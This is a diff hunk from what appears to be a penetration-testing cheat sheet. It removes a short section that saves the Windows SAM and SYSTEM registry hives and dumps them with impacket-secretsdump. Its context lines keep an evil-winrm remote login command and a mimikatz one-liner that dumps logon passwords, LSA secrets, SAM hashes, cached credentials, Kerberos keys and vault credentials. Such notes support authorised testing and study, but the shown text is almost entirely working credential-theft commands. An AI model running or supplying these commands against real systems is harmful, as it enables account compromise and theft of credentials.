@@ -158,15 +158,6 @@ evil-winrm -i <ip> -u <user> -p <password>
 ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 ```
 
-## Extracting hash
-```
-reg save hklm\sam sam
-reg save hklm\system system
-```
-```
-impacket-secretsdump -sam sam -system system LOCAL
-```
-
 ## Extracting hashes
 ### Intro
 -> SAM - Security Account Manager (Store as user accounts)  %SystemRoot%/system32/config/sam  
